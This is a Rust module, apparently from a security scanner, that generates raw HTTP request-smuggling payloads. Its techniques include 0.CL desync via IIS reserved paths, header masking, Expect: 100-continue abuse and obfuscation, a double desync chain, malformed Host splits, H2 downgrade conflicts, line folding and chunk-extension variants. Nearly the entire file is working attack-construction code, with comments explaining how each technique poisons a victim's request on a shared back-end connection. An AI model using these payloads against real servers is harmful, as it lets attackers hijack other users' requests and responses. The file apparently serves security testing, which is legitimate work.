pub const KETTLE_DESYNC_PRIMITIVES: &[&str] = &[
    "zero_cl_desync",
    "vh_masked_header",
    "expect_100_smuggle",
    "expect_100_obfuscated",
    "cl_zero_via_expect",
    "double_desync",
    "malformed_host_split",
    "browser_powered_h2_downgrade",
    "line_folded_header",
    "chunk_extension_variants",
];

/// IIS reserved device paths that trigger an early response, preventing
/// deadlock in 0.CL desync.  The front-end strips or ignores Content-Length;
/// IIS returns a 400/response early so the back-end never hangs.
pub const IIS_RESERVED_PATHS: &[&str] = &["/con", "/aux", "/nul", "/prn", "/com1", "/lpt1"];

/// **0.CL desync** (Kettle BH25 §3.1).
///
/// The front-end ignores `Content-Length` and routes the request based on
/// method/path alone.  The back-end treats `Content-Length: <attack_cl>` as
/// authoritative and reads that many bytes off the connection — including the
/// `smuggled_request` bytes that follow — poisoning the next victim's request
/// buffer.
///
/// IIS reserved paths (`/con`, `/aux`, `/nul`, `/prn`, `/com1`, `/lpt1`)
/// provide the early-response gadget: IIS sends a response immediately without
/// consuming body bytes, so the poisoned bytes stay in the back-end's read
/// buffer and get prepended to the next request rather than blocking the
/// connection.
///
/// Wire format:
/// ```text
/// GET /<reserved-path> HTTP/1.1\r\n
/// Host: t\r\n
/// Content-Length: <attack_cl>\r\n
/// \r\n
/// <smuggled_request>
/// ```
pub fn zero_cl_desync(
    reserved_path: &str,
    smuggled_request: &str,
    attack_cl: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    crate::safety::guard_no_crlf(reserved_path)?;
    crate::safety::guard_prefix_len(reserved_path, 256)?;
    let smuggled = validate_prefix(smuggled_request)?;
    let raw = format!(
        "GET {reserved_path} HTTP/1.1\r\n\
         Host: t\r\n\
         Content-Length: {attack_cl}\r\n\
         \r\n\
         {smuggled}"
    );
    Ok(SmugglingPayload {
        description: format!("0.CL desync path={reserved_path} attack_cl={attack_cl}"),
        variant: SmugglingVariant::KettleDesync,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// **V-H header masking** (Kettle BH25 §4.2).
///
/// A leading space (or character substitution like `Host` → `Xost`) makes the
/// header visible to the front-end parser while the back-end parser ignores or
/// misroutes it.  Both the space-prefix variant and the name-rewrite variant
/// are returned.
///
/// Wire format (space-prefix):
/// ```text
/// GET / HTTP/1.1\r\n
///  <masked_name>: <value>\r\n
/// \r\n
/// ```
///
/// # Errors
///
/// Returns [`crate::safety::SafetyError::HeaderInjection`] if either
/// `masked_name` or `value` contains `\r`, `\n`, or `\0`. The previous
/// implementation called `guard_no_crlf(masked_name).ok()`, silently
/// discarding the error and allowing the raw control bytes to pass through
/// into the wire payload undetected (§15 AUDIT HUNTS: CRLF / control-byte
/// injection).
pub fn vh_masked_header(
    masked_name: &str,
    value: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    crate::safety::guard_no_crlf(masked_name)?;
    crate::safety::guard_no_crlf(value)?;
    // Variant 1: space-prefix on the header name.
    // NOTE: Rust backslash-continuation strips leading whitespace, so we
    // concatenate the SP-prefixed line explicitly to preserve the leading space.
    let space_raw = format!("GET / HTTP/1.1\r\nHost: t\r\n {masked_name}: {value}\r\n\r\n");
    // Variant 2: substitute the first character of the header name with 'X'
    // (e.g., Host → Xost).  If the name is empty we fall back to "X-Unknown".
    let xname = if masked_name.is_empty() {
        "X-Unknown".to_owned()
    } else {
        format!(
            "X{}",
            &masked_name[masked_name
                .char_indices()
                .nth(1)
                .map_or(masked_name.len(), |(i, _)| i)..]
        )
    };
    let xname_raw = format!(
        "GET / HTTP/1.1\r\n\
         Host: t\r\n\
         {xname}: {value}\r\n\
         \r\n"
    );
    Ok(vec![
        SmugglingPayload {
            description: format!("V-H masked space-prefix: {masked_name}"),
            variant: SmugglingVariant::KettleDesync,
            raw_bytes: space_raw.into_bytes(),
            canary: Canary::generate(),
        },
        SmugglingPayload {
            description: format!("V-H masked char-rewrite: {masked_name} → {xname}"),
            variant: SmugglingVariant::KettleDesync,
            raw_bytes: xname_raw.into_bytes(),
            canary: Canary::generate(),
        },
    ])
}

/// **Expect: 100-continue 0.CL abuse** (Kettle BH25 §5.1).
///
/// Many front-ends respond to `Expect: 100-continue` immediately with a
/// `100 Continue` response and do not wait for body bytes.  This means the
/// front-end treats the request as complete (0 body bytes consumed), while the
/// back-end honors `Content-Length: <cl>` and reads that many bytes —
/// including `smuggled_request` — off the shared connection.
///
/// Wire format:
/// ```text
/// GET /logout HTTP/1.1\r\n
/// Host: t\r\n
/// Expect: 100-continue\r\n
/// Content-Length: <cl>\r\n
/// \r\n
/// <smuggled_request>
/// ```
pub fn expect_100_smuggle(
    smuggled_request: &str,
    cl: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let smuggled = validate_prefix(smuggled_request)?;
    let raw = format!(
        "GET /logout HTTP/1.1\r\n\
         Host: t\r\n\
         Expect: 100-continue\r\n\
         Content-Length: {cl}\r\n\
         \r\n\
         {smuggled}"
    );
    Ok(SmugglingPayload {
        description: format!("Expect 100-continue 0.CL abuse cl={cl}"),
        variant: SmugglingVariant::KettleDesync,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// **Obfuscated Expect** (Kettle BH25 §5.2).
///
/// Variants that obfuscate `100-continue` so one parser recognises the Expect
/// directive and another doesn't:
///
/// - `prefix + " 100-continue" + suffix` — e.g., `"y 100-continue"`, `" 100-continue "`
/// - Leading space: `" 100-continue"`
/// - Trailing space: `"100-continue "`
/// - Trailing tab: `"100-continue\t"`
/// - Case flip: `"100-Continue"`, `"100-CONTINUE"`
///
/// `prefix` and `suffix` are injected around `100-continue`; callers can
/// pass empty strings for the canonical variants.
pub fn expect_100_obfuscated(
    prefix: &str,
    suffix: &str,
    smuggled_request: &str,
    cl: usize,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let smuggled = validate_prefix(smuggled_request)?;
    let variants: &[(&str, &str)] = &[
        (prefix, suffix), // caller-supplied
        ("", " "),        // trailing space
        (" ", ""),        // leading space
        ("", "\t"),       // trailing tab
        ("y ", ""),       // "y 100-continue" (Kettle example)
        ("", ""),         // canonical — for baseline reference
    ];
    let case_variants: &[&str] = &["100-Continue", "100-CONTINUE", "100-continue"];
    let mut out = Vec::new();
    for (pre, suf) in variants {
        let expect_value = format!("{pre}100-continue{suf}");
        let raw = format!(
            "GET /logout HTTP/1.1\r\n\
             Host: t\r\n\
             Expect: {expect_value}\r\n\
             Content-Length: {cl}\r\n\
             \r\n\
             {smuggled}"
        );
        out.push(SmugglingPayload {
            description: format!("Obfuscated Expect '{expect_value}'"),
            variant: SmugglingVariant::KettleDesync,
            raw_bytes: raw.into_bytes(),
            canary: Canary::generate(),
        });
    }
    for token in case_variants {
        let raw = format!(
            "GET /logout HTTP/1.1\r\n\
             Host: t\r\n\
             Expect: {token}\r\n\
             Content-Length: {cl}\r\n\
             \r\n\
             {smuggled}"
        );
        out.push(SmugglingPayload {
            description: format!("Obfuscated Expect case '{token}'"),
            variant: SmugglingVariant::KettleDesync,
            raw_bytes: raw.into_bytes(),
            canary: Canary::generate(),
        });
    }
    Ok(out)
}

/// **CL.0 via Expect** (Kettle BH25 §5.3).
///
/// `POST /images/` with `Expect: 100-continue` — many static-file or image
/// endpoints return `405 Method Not Allowed` or `100 Continue` immediately,
/// causing the front-end to treat the body as consumed (CL.0 equivalent).
/// The back-end, which routes to a different handler, honors `Content-Length`
/// and reads `smuggled_request` bytes from the connection.
///
/// Wire format:
/// ```text
/// POST /images/ HTTP/1.1\r\n
/// Host: t\r\n
/// Expect: 100-continue\r\n
/// Content-Length: <cl>\r\n
/// \r\n
/// <smuggled_request>
/// ```
pub fn cl_zero_via_expect(
    smuggled_request: &str,
    cl: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let smuggled = validate_prefix(smuggled_request)?;
    let raw = format!(
        "POST /images/ HTTP/1.1\r\n\
         Host: t\r\n\
         Expect: 100-continue\r\n\
         Content-Length: {cl}\r\n\
         \r\n\
         {smuggled}"
    );
    Ok(SmugglingPayload {
        description: format!("CL.0 via Expect /images/ cl={cl}"),
        variant: SmugglingVariant::KettleDesync,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// **Double desync — 0.CL → CL.0 conversion** (Kettle BH25 §6).
///
/// Stage 1: A 0.CL desync on `stage1_path` plants a partial HTTP/1.1 request
/// in the back-end's buffer — specifically the beginning of a CL.0 attack.
/// Stage 2: A normal CL.0 request on `stage2_path` completes the poisoned
/// request such that a victim's request is mis-routed.
///
/// Returns the concatenated raw bytes of both frames so the caller can send
/// them back-to-back on a single pipelined connection.
///
/// Wire format (stage 1 then stage 2):
/// ```text
/// GET /stage1 HTTP/1.1\r\nHost: t\r\nContent-Length: <n>\r\n\r\nPOST /stage2 HTTP/1.1\r\nHost: t\r\nContent-Length: 0\r\n\r\n<payload>
/// ```
pub fn double_desync(
    stage1_path: &str,
    stage2_path: &str,
    payload: &str,
) -> Result<Vec<u8>, crate::safety::SafetyError> {
    crate::safety::guard_no_crlf(stage1_path)?;
    crate::safety::guard_no_crlf(stage2_path)?;
    crate::safety::guard_prefix_len(stage1_path, 256)?;
    crate::safety::guard_prefix_len(stage2_path, 256)?;
    let payload = validate_prefix(payload)?;
    // Stage 2 body: a CL.0 request whose body is the caller's payload.
    let stage2_body = format!(
        "POST {stage2_path} HTTP/1.1\r\n\
         Host: t\r\n\
         Content-Length: 0\r\n\
         \r\n\
         {payload}"
    );
    // Stage 1: 0.CL attack; attack_cl = len of stage2 body so back-end reads it all.
    let attack_cl = stage2_body.len();
    let stage1 = format!(
        "GET {stage1_path} HTTP/1.1\r\n\
         Host: t\r\n\
         Content-Length: {attack_cl}\r\n\
         \r\n\
         {stage2_body}"
    );
    Ok(stage1.into_bytes())
}

/// **H-V malformed Host (ALB + IIS)** (Kettle BH25 §7).
///
/// AWS ALB rejects requests whose `Host` header contains certain delimiter
/// characters (`/`, `:`, `\\`, `?`, `#`) with a 400.  IIS accepts them and
/// routes them to unexpected handler chains.  By sending a request that ALB
/// would reject *but* has already been forwarded to IIS (e.g. via a desync),
/// a poisoned connection can serve IIS-processed responses to victims.
///
/// Returns a candidate set of probes, one per delimiter character, with the
/// delimiter inserted at position 3 in the host value to produce a variety of
/// split positions.
///
/// # Errors
/// Returns `SafetyError::HeaderInjection` if `host_value` contains `\r`,
/// `\n`, or `\0`.  These control bytes would be interpolated directly into the
/// `Host: {mangled}\r\n` wire line, allowing a hostile caller to inject
/// arbitrary headers into the raw request bytes.
pub fn malformed_host_split(
    host_value: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    // Guard first — host_value is interpolated verbatim into
    // `Host: {mangled}\r\n`. A caller passing `"abc\r\nX-Evil: yes"` would
    // inject a raw header into each of the 8 probe payloads.
    crate::safety::guard_no_crlf(host_value)?;
    let delimiters = [':', '/', '\\', '?', '#', '@', '[', ']'];
    Ok(delimiters
        .iter()
        .map(|&delim| {
            // Insert delimiter after first 3 Unicode scalar values (or at end if
            // shorter).  Using `len().min(3)` would be a byte-index and would
            // panic on multi-byte UTF-8 strings whose character boundary does not
            // fall on byte 3.
            let insert_pos = host_value
                .char_indices()
                .nth(3)
                .map_or(host_value.len(), |(i, _)| i);
            let mangled = format!(
                "{}{}{}",
                &host_value[..insert_pos],
                delim,
                &host_value[insert_pos..]
            );
            let raw = format!(
                "GET / HTTP/1.1\r\n\
                 Host: {mangled}\r\n\
                 \r\n"
            );
            SmugglingPayload {
                description: format!("Malformed Host ALB+IIS delim={delim:?} host={mangled}"),
                variant: SmugglingVariant::KettleDesync,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// **Browser-powered H2→H1 downgrade with conflicting Content-Length**
/// (Kettle BH25 §8, H2.0 / H2.CL / H2.TE).
///
/// After downgrade from HTTP/2 to HTTP/1.1 a front-end proxy may inherit an
/// HTTP/2 body-framing field (`content-length`) that conflicts with what the
/// HTTP/1.1 back-end expects.  This function produces an `H2Evasion`
/// descriptor whose `headers` carry the conflicting `content-length` and an
/// embedded `transfer-encoding: chunked` designed to trigger H2.CL or H2.TE
/// desync upon downgrade.
///
/// Uses the existing `H2Evasion` struct from `h2_evasion.rs` — no new
/// constructors added there.
pub fn browser_powered_h2_downgrade(
    method: &str,
    path: &str,
    body: &[u8],
    declared_cl: usize,
) -> Result<crate::h2_evasion::H2Evasion, crate::safety::SafetyError> {
    crate::safety::guard_no_crlf(method)?;
    crate::safety::guard_no_crlf(path)?;
    crate::safety::guard_prefix_len(method, 32)?;
    crate::safety::guard_prefix_len(path, 2048)?;
    // Build chunk-encoded representation of the body for H2.TE conflict.
    let body_hex = format!("{:x}", body.len());
    let chunked_body = if body.is_empty() {
        "0\r\n\r\n".to_owned()
    } else {
        let body_str = String::from_utf8_lossy(body);
        format!("{body_hex}\r\n{body_str}\r\n0\r\n\r\n")
    };
    Ok(crate::h2_evasion::H2Evasion {
        name: "Browser-powered H2 downgrade (Kettle BH25)",
        description: "H2.CL/H2.TE: declared CL conflicts with body framing after H2→H1 downgrade",
        pseudo_headers: vec![
            (":method".into(), method.to_owned()),
            (":path".into(), path.to_owned()),
            (":scheme".into(), "https".into()),
        ],
        headers: vec![
            // Conflicting CL — front-end inherits from H2, back-end re-parses.
            ("content-length".into(), declared_cl.to_string()),
            // TE header causes H2.TE if the back-end is TE-first.
            ("transfer-encoding".into(), "chunked".into()),
            // Body as a separate content field for frame-level replay.
            ("x-body-frame".into(), chunked_body),
        ],
        needs_continuation_split: false,
        target_flaw: crate::h2_evasion::H2TargetFlaw::ProtocolDowngrade,
        end_stream: Some(!body.is_empty()),
        end_headers: Some(true),
    })
}

/// **Obsolete line-folding** (Kettle BH25 §9, RFC 7230 §3.2.6 obsolete rule).
///
/// RFC 2616 allowed header values to be folded across lines by inserting a
/// `\r\n` followed by at least one SP or HTAB.  RFC 7230 deprecated this
/// ("obs-fold") but many lenient parsers still accept it.  A strict WAF
/// rejects or normalises it differently from a lenient back-end, creating a
/// parsing disagreement.
///
/// The `fold_text` is appended as a continuation line after `value`.
///
/// Wire format:
/// ```text
/// <header>: <value>\r\n
///  <fold_text>\r\n
/// ```
pub fn line_folded_header(header: &str, value: &str, fold_text: &str) -> Vec<u8> {
    // We deliberately allow CRLF in value/fold_text here — that's the technique.
    // The header name itself must not contain CRLF.
    let raw = format!("{header}: {value}\r\n {fold_text}\r\n");
    raw.into_bytes()
}

/// **Chunk extension variants** (Kettle BH25 §10).
///
/// Returns 8+ variants of chunk-encoded `body` where the chunk-size line
/// includes various extension forms.  Strict parsers reject certain extensions;
/// lenient parsers accept them, producing disagreement on where the chunk data
/// ends.
///
/// Variants:
/// 1. `5;x=y`           — standard key=value extension
/// 2. `5;\tx=y`         — tab-separated extension name
/// 3. `5;;x=y`          — duplicate semicolons
/// 4. `5;`              — empty extension (semicolon, no name)
/// 5. `5;x="y;z"`       — quoted-string extension with semicolon inside
/// 6. `5;x=y;z=w`       — two extensions
/// 7. `5;0x=y`          — extension name starts with digit
/// 8. `5;\x00ext=v`     — NUL byte in extension (null-terminator confusion)
///
/// Each `SmugglingPayload` uses the chunk line to wrap a single-byte chunk
/// (`X`) so the body is deterministic regardless of `body` length.  The full
/// `body` is appended after the `0\r\n\r\n` terminator as the smuggled prefix.
///
/// # Errors
/// Returns `SafetyError::PrefixTooLong` if `body` exceeds 64 KiB.
/// Without this guard each call allocates `8 × body.len()` bytes (one clone
/// per variant), so a 500 MiB hostile body would exhaust ~4 GiB of RAM.
pub fn chunk_extension_variants(
    body: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    // OOM guard: 8 payloads × body — without this a 500 MiB body = ~4 GiB.
    // The comment in the previous version said "length-only guard" but no
    // guard was ever implemented. Fixed here.
    crate::safety::guard_prefix_len(body, 64 * 1024)?;
    let smuggled = body.to_owned();
    let chunk_byte = "X";
    let chunk_size = chunk_byte.len(); // 1
    let hex_size = format!("{chunk_size:x}");
    let extensions: &[(&str, &str)] = &[
        ("standard key=value", ";x=y"),
        ("tab before ext name", ";\tx=y"),
        ("duplicate semicolons", ";;x=y"),
        ("empty extension", ";"),
        ("quoted-string ext", ";x=\"y;z\""),
        ("two extensions", ";x=y;z=w"),
        ("digit-start ext name", ";0x=y"),
        ("NUL in extension", ";\x00ext=v"),
    ];
    Ok(extensions
        .iter()
        .map(|(desc, ext)| {
            let body_section = format!("{hex_size}{ext}\r\n{chunk_byte}\r\n0\r\n\r\n{smuggled}");
            let raw = format!(
                "POST / HTTP/1.1\r\n\
                 Host: t\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 {body_section}"
            );
            SmugglingPayload {
                description: format!("Chunk-ext {desc}: {hex_size}{ext}"),
                variant: SmugglingVariant::ChunkExtension,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

#[cfg(test)]
#[path = "smuggling_tests.rs"]
mod tests;
